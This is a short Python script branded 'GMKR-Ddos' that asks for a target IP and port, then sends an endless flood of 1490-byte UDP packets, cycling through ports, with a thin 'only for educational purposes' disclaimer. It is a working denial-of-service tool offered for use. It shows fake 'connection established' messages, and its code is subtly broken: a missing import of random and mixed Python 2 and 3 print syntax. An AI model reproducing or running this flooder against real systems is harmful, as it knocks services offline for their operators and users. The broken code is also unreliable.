print ("\033[92m")
import os
import time
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet GMKR-Ddos")
print
print("Coded By : GAMKERS")
print("Author   : GAMKERS")
print("Github   : github.com/gamkers")
ip = input("Target IP: ")
port = int(input("Port: "))
os.system("clear")
os.system("figlet GMKR-Ddos")
print("Team : GAMKERS")
print ("\033[92m")
print ("________________TRYING TO REACH THE SERVER_____________________")
time.sleep(3)
print("_________________CONNECTION ESTABLISHED________________________")
time.sleep(3)
print("DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s on port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
